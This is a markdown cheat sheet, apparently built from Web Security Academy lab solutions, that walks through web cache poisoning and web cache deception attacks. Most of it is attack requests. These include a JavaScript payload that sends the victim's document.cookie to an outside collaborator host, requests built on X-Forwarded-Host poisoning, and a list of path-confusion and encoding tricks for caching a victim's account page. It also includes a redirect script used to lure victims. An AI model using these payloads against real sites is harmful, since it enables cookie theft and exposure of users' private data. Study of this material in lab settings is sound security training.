## 🎯 Identification

### Key Indicators
1. **File:** `/resources/js/tracking.js` exists
2. **Header:** `X-Cache: hit` in response

**If you see BOTH** → Web cache poisoning is likely possible!

# Web Cache Poisoning

You need to replace the cached content with the payload. 

Often force a redirection or retrieval form exploit server.
## 🔥 Exploitation

### Basic Attack Flow

#### 1. Find Unkeyed Input
Test headers that might not be part of cache key:
```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.com
```

#### 2. Check Response
Look for your input reflected:
```html
<script src="//exploit-server.com/resources/js/tracking.js"></script>
```

#### 3. Set Up Exploit Server
**File:** `/resources/js/tracking.js`

**Body:**
```javascript
document.location='http://burp.oastify.com/?c='+document.cookie
```

#### 4. Poison the Cache
**IMPORTANT:** Send the poisoned request **multiple times** (10+ times) until cache is poisoned.

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.com
```

# Web cache Deception

You can deceive the cache server to cache sensitive information for you to retrieve afterwards.

## 🔥 Exploitation

### Basic Attack Flow

#### 1. Find cachable content

Often static files are stored.

Original

```http
GET /my-account HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net
```

To 
Static file
```http
GET /my-account/a.svg HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net
```
Regex static content or directory
```http
GET /my-account/static HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net
```
Normalization discrepancies Cache fails
```http
GET /static/..%2fmy-account HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net
```
Normalization discrepancies Server fails
```http
GET /my-account/..%2fstatic HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net

<!-- /my-account;/..%2fstatic -->
```
Server delimiter unknown by cache (Srping)
```http
GET /my-account;a.ico HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net
```
Server delimiter and extension unknown by cache (Ruby)
```http
GET /my-account.a.ico HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net
```
Server delimiter encoded for cache layer
```http
GET /my-account%3fwcd.css HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net
```
Server delimiter encoded for cache layer
```http
GET /my-account%3fwcd.css HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net

<!-- %3f -> ? -->
<!-- %23 -> # -->
```
Encoded payload
```http
GET /my-account%2e%63%73%73 HTTP/2
Host: 0a4700b60424f469803e0da900170049.web-security-academy.net

<!-- try adding %00 or %0A or others -->
```
#### 2. Check Response

If the response is cached (miss and then hit) with the sensitive content (like profile), you can force a redirection to an user to the deceived endpoint to store their sensitive view.

```http
GET /my-account/b.svg HTTP/2
Host: lab.net
Cookie: session=bKFbxzomuAnFF6bCgOuXC4JK7vn04CmO


```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 3928

<!DOCTYPE html>
...
```
#### 3. Set Up Exploit Server

```html
<script>
window.location.href = "lab.net/my-account/b.svg"
</script>
```

#### 4. Get cached content


```http
GET /my-account/b.svg HTTP/2
Host: lab.net


```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 16
X-Cache: hit
Content-Length: 3928

<!DOCTYPE html>
...
Your API Key is: LVP5JIDPHX9T17ONgJYmShNREKAXYpY5
...
```